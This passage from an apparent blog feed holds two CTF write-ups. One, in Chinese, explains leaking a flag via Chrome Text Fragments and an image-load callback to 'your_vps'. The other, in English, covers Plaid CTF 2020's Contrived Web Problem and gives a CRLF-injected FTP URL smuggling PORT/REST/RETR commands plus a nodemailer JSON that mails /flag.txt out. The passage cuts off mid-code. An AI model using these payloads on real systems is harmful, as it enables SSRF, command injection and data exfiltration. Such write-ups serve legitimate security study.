class="hljs-number">1000</span>);</span><br><span class="line">    res.send(<span class="hljs-string">&quot;injection&quot;</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6B64;&#x65F6;&#x4F1A;&#x6709;&#x4E00;&#x4E2A; 1s &#x5EF6;&#x65F6;&#x7B49;&#x5F85;&#xFF0C;&#x8FD9;&#x4E2A;&#x7B49;&#x5F85;&#x5C31;&#x662F;&#x4E3A;&#x4E86;&#x7B49;&#x5F85; Text Fragments &#x662F;&#x5426;&#x5339;&#x914D;&#x5230; FLAG&#x7684;&#x5224;&#x65AD;</p></li><li><p>&#x5982;&#x679C; Text Fragments &#x5339;&#x914D;&#x5230;&#x4E86;&#xFF0C;&#x5C31;&#x4F1A;&#x89E6;&#x53D1;&#x6EDA;&#x52A8;&#xFF0C;&#x7528;&#x6237;&#x89C6;&#x7A97;&#x6EDA;&#x52A8;&#x5230; FLAG &#x5904;&#xFF0C;&#x89E6;&#x53D1;&#x8BF7;&#x6C42;&#x61D2;&#x52A0;&#x8F7D;&#x7684;&#x56FE;&#x7247;<code>&lt;img src=&quot;http://your_vps/exfiltrated&quot; loading=&quot;lazy&quot;&gt;</code>&#xFF0C;&#x8BF7;&#x6C42;&#x5230; exfiltrated &#x8DEF;&#x7531;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="hljs-string">&quot;/exfiltrated&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    match = <span class="hljs-literal">true</span>;</span><br><span class="line">    res.send(<span class="hljs-string">&quot;exfiltrated&quot;</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6B64;&#x65F6;&#x5C06; match &#x8BBE;&#x7F6E;&#x4E3A; true &#xFF0C;&#x8BA9; injection &#x5B8C;&#x6210;&#x6211;&#x4EEC;&#x7684;&#x5224;&#x65AD;&#x56DE;&#x663E;&#x3002;</p></li></ol><p>&#x6574;&#x4E2A;&#x653B;&#x51FB;&#x6D41;&#x7A0B;&#x5927;&#x81F4;&#x5C31;&#x8FD9;&#x6837;&#xFF0C;&#x56FE;&#x5C31;&#x61D2;&#x5F97;&#x753B;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x6574;&#x4E2A;&#x9898;&#x76EE;&#x4EE5;&#x53CA; wrtieup &#x8017;&#x8D39;&#x4E86;&#x6211;&#x4E0D;&#x5C11;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x6D89;&#x53CA;&#x5230;&#x7684;&#x6280;&#x672F;&#x90FD;&#x5206;&#x6790;&#x5B8C;&#x4E86;&#xFF0C;&#x5269;&#x4E0B;&#x5C31;&#x662F;&#x91CD;&#x590D; leak FLAG &#x4E86;&#x3002;&#xFF08;&#x95EE;&#x4E86;&#x4F5C;&#x8005;&#xFF0C;FLAG &#x4E00;&#x5171; 38 &#x4F4D;&#x2026;</p><h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><p>&#x8FD9;&#x91CC;&#x5199;&#x4E00;&#x70B9;&#x9898;&#x5916;&#x8BDD;</p><h3 id="postMessage"><a href="#postMessage" class="headerlink" title="postMessage"></a>postMessage</h3><p>&#x5173;&#x4E8E; uBlock &#x4F7F;&#x7528; <code>postMessage</code> &#x590D;&#x5236; User Activation &#x7684;&#x65B9;&#x6CD5;&#x6211;&#x4ECD;&#x7136;&#x8868;&#x793A;&#x5B58;&#x7591;&#xFF0C;&#x56E0;&#x4E3A;&#x81EA;&#x5DF1;&#x6839;&#x636E;&#x9605;&#x8BFB;&#x7684;&#x6587;&#x6863;&#xFF0C;<code>postMessage</code>&#x4F20;&#x9012; User Activation &#x9700;&#x8981;&#x6709;&#x5BF9;&#x5E94;&#x7684;&#x914D;&#x7F6E;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">window</span>.parent.postMessage(<span class="hljs-string">&apos;resize&apos;</span>, {<span class="hljs-attr">includeUserActivation</span>: <span class="hljs-literal">true</span>});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F46;&#x662F;&#x6211;&#x5E76;&#x6CA1;&#x6709;&#x5728; uBlock &#x770B;&#x5230;&#x76F8;&#x5173;&#x7684;&#x914D;&#x7F6E;&#xFF0C;<code>postMessage</code>&#x90FD;&#x662F;&#x4F7F;&#x7528;&#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#xFF0C;&#x7136;&#x540E;&#x5173;&#x4E8E;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x6211;&#x4E5F;&#x67E5;&#x770B;&#x4E86;&#x90E8;&#x5206; Chromium &#x7684;&#x6E90;&#x7801;&#xFF0C;&#x5BF9;&#x4E8E; UserActivation &#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x662F; false &#x7684;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200425014346.png" alt></p><p>&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x901A;&#x8FC7; <a href="#Verification">Verification</a> &#x73AF;&#x8282;&#x6D4B;&#x8BD5;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x786E;&#x5B9E;&#x9700;&#x8981; uBlock &#x6765;&#x8FDB;&#x884C;&#xFF0C;&#x7531;&#x4E8E;&#x81EA;&#x5DF1;&#x65F6;&#x95F4;&#x5E76;&#x4E0D;&#x662F;&#x7279;&#x522B;&#x591A;&#xFF0C;&#x6700;&#x8FD1;&#x82B1;&#x592A;&#x591A;&#x65F6;&#x95F4;&#x5728;&#x8FD9;&#x9898;&#x7684;&#x590D;&#x76D8;&#x4E0A;&#xFF0C;&#x6240;&#x4EE5;&#x6700;&#x8FD1;&#x4E0D;&#x6253;&#x7B97;&#x518D;&#x6DF1;&#x7A76;&#x8FD9;&#x90E8;&#x5206;&#x7684;&#x5185;&#x5BB9;&#x4E86;&#xFF0C;&#x8FD9;&#x90E8;&#x5206;&#x7684;&#x5185;&#x5BB9;&#x4E0D;&#x4EC5;&#x6D89;&#x53CA;&#x5230; User Activation &#xFF0C;&#x8FD8;&#x6D89;&#x53CA;&#x5230;&#x4E00;&#x4E9B;&#x5173;&#x4E8E; User Activation &#x62BD;&#x8C61;&#x6A21;&#x578B;&#x7684;&#x4EE3;&#x7801;&#x5B9E;&#x73B0;&#xFF0C;&#x5982;&#x679C;&#x8981;&#x6DF1;&#x7A76;&#x7684;&#x8BDD;&#x5C31;&#x9700;&#x8981;&#x82B1;&#x6BD4;&#x8F83;&#x591A;&#x7684;&#x65F6;&#x95F4;&#x4E86;&#x3002;</p><h3 id="Verification"><a href="#Verification" class="headerlink" title="Verification"></a>Verification</h3><p>&#x81F3;&#x4E8E;&#x9A8C;&#x8BC1;&#x4E3A;&#x4EC0;&#x4E48;&#x4E00;&#x5B9A;&#x9700;&#x8981; uBlock &#x6765;&#x53C2;&#x4E0E;&#xFF0C;&#x8FD9;&#x90E8;&#x5206;&#x9A8C;&#x8BC1;&#x4E5F;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x5C31;&#x662F;&#x81EA;&#x5DF1;&#x521B;&#x5EFA;&#x4E00;&#x4E2A; issue &#xFF0C;&#x5185;&#x5BB9;&#x8BBE;&#x7F6E;&#x4E3A;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x6D4B;&#x8BD5;&#x7684; FLAG&#xFF0C;&#x6BD4;&#x5982; PCTF{TEST} &#xFF0C;&#x5176;&#x4ED6;&#x7684;&#x8DDF; EXP &#x8FC7;&#x7A0B;&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x628A; FLAG &#x7684;&#x5730;&#x5740;&#x6362;&#x4E3A;&#x81EA;&#x5DF1;&#x6D4B;&#x8BD5; FLAG &#x7684;&#x5730;&#x5740;&#x5373;&#x53EF;&#xFF0C;&#x7136;&#x540E;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<strong>&#x5173;&#x95ED; Chrome &#x62D3;&#x5C55; uBlock</strong> &#x6765;&#x6D4B;&#x4E00;&#x904D;&#xFF08;&#x6700;&#x597D;&#x662F;&#x4ECE; Chrome &#x62D3;&#x5C55;&#x5173;&#x95ED;&#xFF0C;&#x4F7F;&#x7528;&#x62D3;&#x5C55;&#x672C;&#x8EAB;&#x7684;&#x5173;&#x95ED;&#x5E76;&#x4E0D;&#x662F;&#x5168;&#x7AD9;&#x5173;&#x95ED;&#xFF09;&#xFF0C;&#x591A;&#x6D4B;&#x8BD5;&#x51E0;&#x6B21;&#x5C31;&#x4F1A;&#x53D1;&#x73B0;&#x786E;&#x5B9E;&#x9700;&#x8981;&#x5F15;&#x5165; uBlock &#x6765;&#x5B9E;&#x73B0; Leak Data &#x3002;</p><h3 id="Text-Fragment"><a href="#Text-Fragment" class="headerlink" title="Text Fragment"></a>Text Fragment</h3><p>&#x8FD9;&#x91CC;&#x5176;&#x5B9E;&#x6BD4;&#x8F83;&#x53EF;&#x60DC;&#x7684;&#x662F; @wupco &#x5E08;&#x5085;&#xFF0C;&#x4ED6;&#x4E4B;&#x524D;&#x5173;&#x6CE8;&#x5230;&#x4E86;&#x8FD9;&#x4E2A; chrome Text Fragment &#x7684;&#x529F;&#x80FD;&#xFF0C;&#x5E76;&#x4E14;&#x4E5F;&#x5F15;&#x8D77;&#x4E86;&#x4ED6;&#x7684;&#x6CE8;&#x610F;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>#:~:text=flag{this_is_a_flag}</code>&#x7684;&#x5F62;&#x5F0F; leak data &#xFF0C;&#x53EF;&#x60DC;&#x4ED6;&#x8868;&#x793A;&#x6BD4;&#x8D5B;&#x7684;&#x65F6;&#x5019;&#x6CA1;&#x6709;&#x60F3;&#x8D77;&#x6765;&#x3002;&#xFF08;&#x4E0D;&#x6127;&#x662F;&#x8001; CTFer &#xFF0C;&#x4E00;&#x5F00;&#x53E3;&#x5C31;&#x77E5;&#x9053;&#x662F;&#x8001; CTFer &#x4E86;</p><blockquote><p>&#x200B;    How about using #:~:text=flag{this_is_a_flag} and onscroll to leak data?</p></blockquote><div class="twitter-wrapper"><blockquote class="twitter-tweet"><a href="https://twitter.com/wupco1996/status/1226938811147522060" target="_blank" rel="noopener"></a></blockquote></div><script async defer src="//platform.twitter.com/widgets.js" charset="utf-8"></script><h3 id="Other-Web-Challanges"><a href="#Other-Web-Challanges" class="headerlink" title="Other Web Challanges"></a>Other Web Challanges</h3><p>&#x8FD9;&#x6B21;&#x6BD4;&#x8D5B;&#x7684; Web &#x90FD;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#xFF0C;<a href="https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/">Contrived Web Problem</a> &#x662F;&#x4E00;&#x9053; FTP &#x5230; SSRF &#x7684;&#x5229;&#x7528;&#x94FE;&#xFF0C;wp &#x53EF;&#x4EE5;&#x770B;&#x6211;&#x7684;&#x535A;&#x5BA2;&#xFF0C;&#x4F46;&#x662F;&#x53EA;&#x6709;&#x82F1;&#x6587;&#x90E8;&#x5206;&#xFF0C;&#x5E76;&#x4E14;&#x6CA1;&#x6709;&#x5B8C;&#x6574;&#x7684; payload &#xFF0C;&#x53EA;&#x804A;&#x4E86;&#x804A;&#x5927;&#x81F4;&#x7684;&#x601D;&#x8DEF;&#xFF0C;&#x800C;&#x4E14;&#x82F1;&#x6587;&#x6C34;&#x5E73;&#x53EF;&#x80FD;&#x6BD4;&#x8F83;&#x62D9;&#xFF0C;&#x4E0D;&#x77E5;&#x9053;&#x4EE5;&#x540E;&#x81EA;&#x5DF1;&#x6709;&#x6CA1;&#x6709;&#x7A7A;&#x5199;&#x4E2D;&#x6587;&#x7684;&#xFF0C;&#x81EA;&#x5DF1;&#x4E5F;&#x4E0D;&#x592A;&#x786E;&#x5B9A;&#x3002; Mooz Chat &#x542C; @wupco &#x5E08;&#x5085;&#x8BF4;&#x662F;&#x4E00;&#x4E2A;&#x4E2D;&#x95F4;&#x4EBA;&#x52AB;&#x6301;&#x7684; web &#x9898;&#xFF0C;&#xFF08;&#x592A;&#x5F3A;&#x5927;&#x4E86;&#xFF0C;&#x9700;&#x8981;&#x9006;&#x5411;&#xFF0C;&#x8868;&#x793A;&#x5355;&#x51ED;&#x81EA;&#x5DF1;&#x5F04;&#x4E0D;&#x4E86;&#xFF09;&#xFF0C;&#x4F46;&#x662F;&#x4E2D;&#x95F4;&#x4EBA;&#x52AB;&#x6301;&#x7684;&#x9898;&#x76EE;&#x786E;&#x5B9E;&#x4EE4;&#x4EBA;&#x8033;&#x76EE;&#x4E00;&#x65B0;&#xFF01;&#x5982;&#x679C;&#x5E08;&#x5085;&#x4EEC;&#x6709;&#x76F8;&#x5173;&#x7684;&#x601D;&#x8DEF;&#x6216;&#x8005; wp &#x6B22;&#x8FCE;&#x4E00;&#x8D77;&#x4EA4;&#x6D41;&#xFF01;</p><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>&#x8FD9;&#x6B21;&#x6BD4;&#x8D5B;&#x7684;&#x9898;&#x4E2A;&#x4EBA;&#x89C9;&#x5F97;&#x8FD8;&#x662F;&#x6BD4;&#x8F83;&#x504F;&#x201C;&#x4FA7;&#x4FE1;&#x9053;&#x201D;&#x7684;&#xFF0C;&#x8FD9;&#x7C7B;&#x7684;&#x9898;&#x76EE;&#x6211;&#x90FD;&#x89C9;&#x5F97;&#x975E;&#x5E38;&#x597D;&#x73A9;&#xFF0C;&#x56E0;&#x4E3A;&#x4E0D;&#x540C;&#x4E8E;&#x4F20;&#x7EDF;&#x7684; Web &#x653B;&#x51FB;&#xFF0C;&#x8FD8;&#x901A;&#x5E38;&#x5F15;&#x5165;&#x4E86;&#x5F88;&#x591A;&#x6BD4;&#x8F83;&#x65B0;&#x7684;&#x7406;&#x5FF5;&#x4E0E;&#x653B;&#x51FB;&#x94FE;&#xFF0C;&#x867D;&#x7136; User Activation &#x76F8;&#x5173;&#x7684;&#x90E8;&#x5206;&#x8FD8;&#x6CA1;&#x6709;&#x5B8C;&#x5168;&#x5F04;&#x660E;&#x767D;&#xFF0C;&#x800C;&#x4E14;&#x8FD9;&#x4E2A;&#x9898;&#x4F5C;&#x8005;&#x8FD8;&#x662F;&#x6545;&#x610F;&#x5F15;&#x5165;&#x7684; uBlock &#x6765;&#x534F;&#x52A9;&#x6211;&#x4EEC;&#x505A;&#x9898;&#xFF0C;&#x4E5F;&#x7B97;&#x662F;&#x6BD4;&#x8F83;&#x7684;&#x53CB;&#x597D;&#x4E86;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x53EF;&#x80FD;&#x6211;&#x4EEC;&#x6CA1;&#x6709;&#x5B8C;&#x5168; Get &#x5230;&#x51FA;&#x9898;&#x4EBA;&#x7684;&#x70B9;&#x3002;&#x6240;&#x4EE5;&#x8FD9;&#x6B21;&#x6BD4;&#x8D5B;&#x5BF9;&#x6211;&#x800C;&#x8A00;&#x66F4;&#x8BA9;&#x4EBA;&#x89C9;&#x5F97;&#x8033;&#x76EE;&#x4E00;&#x65B0;&#x7684;&#x662F; Chrome &#x65B0;&#x7279;&#x6027; Text Fragemnts &#xFF0C;&#x8BA9;&#x4EBA;&#x7814;&#x7A76;&#x7684;&#x66F4;&#x591A;&#x7684;&#x662F; User Activation &#x3002;</p><p>&#x867D;&#x7136;&#x8FD9;&#x79CD;&#x9898;&#x76EE;&#x5BF9;&#x4E8E;&#x5B9E;&#x6218;&#x53EF;&#x80FD;&#x663E;&#x5F97;&#x9E21;&#x808B;&#xFF0C;&#x751A;&#x81F3;&#x201C;&#x6BEB;&#x65E0;&#x4F5C;&#x7528;&#x201D;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x7C7B;&#x9898;&#x76EE;&#x6211;&#x89C9;&#x5F97;&#x6253;&#x5F00;&#x4E86;&#x81EA;&#x5DF1;&#x7684;&#x89C6;&#x91CE;&#xFF0C;&#x8BA9;&#x6211;&#x5173;&#x6CE8;&#x5230;&#x4E86;&#x66F4;&#x591A;&#x65B0;&#x4E1C;&#x897F;&#xFF0C;&#x66F4;&#x4F55;&#x51B5;&#x8FD9;&#x7C7B;&#x7684;&#x9898;&#x76EE;&#x5728;&#x56FD;&#x5185;&#x8FD8;&#x662F;&#x5F88;&#x5C11;&#x89C1;&#x5230;&#x7684;&#xFF0C;&#x6BD5;&#x7ADF;&#x5F04;&#x8FD9;&#x7C7B;&#x9898;&#x76EE;&#xFF0C;&#x4ECE;&#x4E3B;&#x8981;&#x653B;&#x51FB;&#x94FE;&#x6784;&#x9020;&#x5230;&#x7EC6;&#x8282;&#x8BBE;&#x7F6E;&#x90FD;&#x9700;&#x8981;&#x7CBE;&#x5FC3;&#x7684;&#x63E3;&#x6469;&#x4E0E;&#x63A8;&#x6572;&#xFF0C;&#x66F4;&#x4F55;&#x51B5;&#x662F;&#x201C;&#x4FA7;&#x4FE1;&#x9053;&#x201D;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x6CA1;&#x6709;&#x6DF1;&#x539A;&#x7684;&#x6280;&#x672F;&#x79EF;&#x6DC0;&#x51FA;&#x4E0D;&#x6765;&#x8FD9;&#x7C7B;&#x8BA9;&#x5168;&#x7403;&#x5927;&#x90E8;&#x5206; CTFer &#x7206;&#x96F6;&#x7684;&#x9AD8;&#x96BE;&#x5EA6;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x4E5F;&#x5E0C;&#x671B;&#x56FD;&#x5185;&#x4EE5;&#x540E;&#x80FD;&#x51FA;&#x73B0;&#x4E00;&#x4E9B;&#x8FD9;&#x7C7B;&#x9AD8;&#x8D28;&#x91CF;&#x7684;&#x9898;&#x76EE;&#x5427;&#x3002;</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://www.chromestatus.com/feature/5722065667620864" target="_blank" rel="noopener">User Activation v2</a></p><p><a href="https://mustaqahmed.github.io/user-activation-v2/" target="_blank" rel="noopener">User Activation v2 (UAv2)</a></p><p><a href="https://developers.google.com/web/updates/2019/01/user-activation" target="_blank" rel="noopener">Making user activation consistent across APIs</a></p><p><a href="https://docs.google.com/document/d/1mcxB5J_u370juJhSsmK0XQONG2CIE3mvu827O-Knw_Y/edit#heading=h.hy5wkxbrpq6o" target="_blank" rel="noopener">Existing Chrome APIs using user gestures</a></p><p><a href="https://github.com/dtapuska/useractivation" target="_blank" rel="noopener">JS API for querying User Activation</a></p><p><a href="https://mustaqahmed.github.io/user-activation-delegation/" target="_blank" rel="noopener">Activation Transfer through postMessages</a></p></body></html>]]></content>
        <author>
            <name><![CDATA[Zedd‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/</id>
        <title><![CDATA[Plaid CTF 2020 Contrived Web Problem Write Up]]></title>
        <updated>2020-05-05T17:31:59+08:00</updated>
        <link href="https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/"><![CDATA[<html><head></head><body><p>Here is my write up of Contrived Web Problem in Plaid CTF 2020.</p><a id="more"></a><p>[TOC]</p><h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>You can get the attachment of the chall in this <a href="https://github.com/ZeddYu/Plaid-CTF-2020-Web" target="_blank" rel="noopener">repo</a>.</p><ol><li>You can find CRLF in ftp then use CRLF to inject ftp command.</li><li>You can use PORT command to build a TCP connection with rabbitmq server.</li><li>Make a HTTP message which can let the nodemailer send a email containing the flag as a attachment to your email through rabbitmq web api.</li><li>Hide this HTTP message in a PNG. Upload the picture as your profile.</li><li>Use the REST command to cut the PNG and let PETR command return the HTTP message which is in the PNG to rabbitmq server.</li><li>Check FLAG in your email.</li></ol><h2 id="CRLF-in-FTP"><a href="#CRLF-in-FTP" class="headerlink" title="CRLF in FTP"></a>CRLF in FTP</h2><p>We guess there should be a CRLF in FTP at first. And use <code>%250d%250a</code> to test it because it use the following code.</p><p></p><figure class="highlight typescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (parsed.protocol === <span class="hljs-string">&quot;ftp:&quot;</span>) {</span><br><span class="line">  <span class="hljs-keyword">let</span> username = <span class="hljs-built_in">decodeURIComponent</span>(parsed.username);</span><br><span class="line">  <span class="hljs-keyword">let</span> password = <span class="hljs-built_in">decodeURIComponent</span>(parsed.password);</span><br><span class="line">  <span class="hljs-keyword">let</span> filename = <span class="hljs-built_in">decodeURIComponent</span>(parsed.pathname);</span><br><span class="line">  <span class="hljs-keyword">let</span> ftpClient = <span class="hljs-keyword">await</span> connectFtp({</span><br><span class="line">    host: parsed.hostname,</span><br><span class="line">    port: parsed.port !== <span class="hljs-string">&quot;&quot;</span> ? <span class="hljs-built_in">parseInt</span>(parsed.port) : <span class="hljs-literal">undefined</span>,</span><br><span class="line">    user: username !== <span class="hljs-string">&quot;&quot;</span> ? username : <span class="hljs-literal">undefined</span>,</span><br><span class="line">    password: password !== <span class="hljs-string">&quot;&quot;</span> ? password : <span class="hljs-literal">undefined</span>,</span><br><span class="line">  });</span><br><span class="line">  image = <span class="hljs-keyword">await</span> ftpClient.get(filename);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>Send this url through <code>api/image</code>.</p><p></p><figure class="highlight llvm hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/image?url=ftp://<span class="hljs-number">2</span>:<span class="hljs-number">2</span><span class="hljs-symbol">%250</span>d<span class="hljs-symbol">%250</span>aPORT<span class="hljs-symbol">%20172</span>,<span class="hljs-number">32</span>,<span class="hljs-number">56</span>,<span class="hljs-number">72</span>,<span class="hljs-number">61</span>,<span class="hljs-number">56</span><span class="hljs-symbol">%250</span>d<span class="hljs-symbol">%250</span>aREST<span class="hljs-symbol">%206</span><span class="hljs-symbol">%250</span>d<span class="hljs-symbol">%250</span>aRETR<span class="hljs-symbol">%20</span><span class="hljs-symbol">%252</span>fuser<span class="hljs-symbol">%252</span>fb<span class="hljs-number">21791e2</span><span class="hljs-number">-6016</span><span class="hljs-number">-4</span><span class="hljs-keyword">c</span><span class="hljs-number">36</span><span class="hljs-number">-8</span>f<span class="hljs-number">9</span>a<span class="hljs-number">-6054750</span>d<span class="hljs-number">2</span>b<span class="hljs-number">5</span>a<span class="hljs-symbol">%252</span>fprofile<span class="hljs-symbol">%252</span>epng<span class="hljs-title">@ftp</span>:<span class="hljs-number">21</span>/user/b<span class="hljs-number">21791e2</span><span class="hljs-number">-6016</span><span class="hljs-number">-4</span><span class="hljs-keyword">c</span><span class="hljs-number">36</span><span class="hljs-number">-8</span>f<span class="hljs-number">9</span>a<span class="hljs-number">-6054750</span>d<span class="hljs-number">2</span>b<span class="hljs-number">5</span>a/profile.png</span><br></pre></td></tr></tbody></table></figure><p></p><p>This url will make a request like this.</p><p><img src="/images/plaid-ctf/1.png" alt></p><p>So we get a CRLF now.</p><p>Or you can audit the code of ftp <a href="https://github.com/mscdex/node-ftp" target="_blank" rel="noopener">https://github.com/mscdex/node-ftp</a> then you can find it do nothing with CRLF.</p><h2 id="The-active-mode-of-FTP"><a href="#The-active-mode-of-FTP" class="headerlink" title="The active mode of FTP"></a>The active mode of FTP</h2><p>FTP have two modes, one is active and the other is passive.</p><blockquote><p>In <em>active</em> mode, the client establishes the command channel but the <em>server</em> is responsible for establishing the data channel. This can actually be a problem if, for example, the client machine is protected by firewalls and will not allow unauthorised session requests from external parties.</p><p>In <em>passive</em> mode, the client establishes <em>both</em> channels. We already know it establishes the command channel in active mode and it does the same here.</p></blockquote><p>If we don&#x2019;t inject code through CRLF, we can get the FTP traffic like this:</p><p><img src="/images/plaid-ctf/2.png" alt></p><p>So it will use <code>PASV</code> command to open passive mode and build a connection with client.</p><p>Why not inject <code>PORT</code> commant through CRLF to let ftp-srv open active mode and let ftp-srv connect with my server?</p><p>Yeah. Just like this. I use <code>PORT</code> command to let ftp-srv connect with my server.</p><p><img src="/images/plaid-ctf/1.png" alt></p><p>But if you try with <code>LIST</code> or something else following by <code>PORT</code> command, you can&#x2019;t get the response on your server. It&#x2019;s a bit strange that I still confused about it. If you know something about this, welcome to discuss.</p><h2 id="The-mail-server"><a href="#The-mail-server" class="headerlink" title="The mail server"></a>The mail server</h2><p>And how can we get flag? Use FTP? But the flag.txt is not on the ftp server. So we should think about how to get flag.</p><p>I notice there is a function that use to reset user&#x2019;s password.</p><p>services/api/index.ts</p><p></p><figure class="highlight typescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="hljs-string">&quot;/password-reset&quot;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {</span><br><span class="line">  <span class="hljs-keyword">let</span> { email } = req.body;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> email !== <span class="hljs-string">&quot;string&quot;</span>) {</span><br><span class="line">    res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Bad body&quot;</span>);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> newPassword = <span class="hljs-built_in">Array</span>.from(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">16</span>), <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span>[<span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">36</span>)]).join(<span class="hljs-string">&quot;&quot;</span>);</span><br><span class="line">  <span class="hljs-keyword">let</span> hashedPassword = <span class="hljs-keyword">await</span> bcrypt.hash(newPassword, <span class="hljs-number">14</span>);</span><br><span class="line">  <span class="hljs-keyword">await</span> withClient(<span class="hljs-function">(<span class="hljs-params">client</span>) =&gt;</span> client.query(<span class="hljs-string">`</span></span><br><span class="line"><span class="hljs-string">UPDATE user_auth</span></span><br><span class="line"><span class="hljs-string">SET password = $2</span></span><br><span class="line"><span class="hljs-string">WHERE email = $1</span></span><br><span class="line"><span class="hljs-string">`</span>, [email, hashedPassword]));</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> channel = <span class="hljs-keyword">await</span> rabbit.createChannel();</span><br><span class="line">  channel.sendToQueue(<span class="hljs-string">&quot;email&quot;</span>, Buffer.from(<span class="hljs-built_in">JSON</span>.stringify({</span><br><span class="line">    to: email,</span><br><span class="line">    subject: <span class="hljs-string">&quot;Password Reset&quot;</span>,</span><br><span class="line">    text: <span class="hljs-string">`Hello there, your new password is <span class="hljs-subst">${newPassword}</span>`</span>,</span><br><span class="line">  })));</span><br><span class="line"></span><br><span class="line">  res.status(<span class="hljs-number">200</span>).send(<span class="hljs-string">&quot;Password reset&quot;</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>It seems we can&#x2019;t control the <code>${newPassword}</code>. But I find a way to get flag through reading nodemailer&#x2019;s documentation.</p><p><a href="https://nodemailer.com/message/attachments/" target="_blank" rel="noopener">https://nodemailer.com/message/attachments/</a></p><p>We can send an email containing the flag as attachment! We can make a json like this:</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">&quot;to&quot;</span>:<span class="hljs-string">&quot;your@gmail.com&quot;</span>,<span class="hljs-attr">&quot;subject&quot;</span>:<span class="hljs-string">&quot;Password Reset&quot;</span>,<span class="hljs-attr">&quot;text&quot;</span>:<span class="hljs-string">&quot;Hello there, your new password is newpass&quot;</span>,<span class="hljs-attr">&quot;attachments&quot;</span>:[{<span class="hljs-attr">&quot;filename&quot;</span>:<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-attr">&quot;path&quot;</span>:<span class="hljs-string">&quot;/flag.txt&quot;</span>}]}</span><br></pre></td></tr></tbody></table></figure><p></p><p>So what we need to do is to control nodemailer to send our message.</p><h2 id="rabbitmq"><a href="#rabbitmq" class="headerlink" title="rabbitmq"></a>rabbitmq</h2><p>services/email/index.ts</p><p></p><figure class="highlight typescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 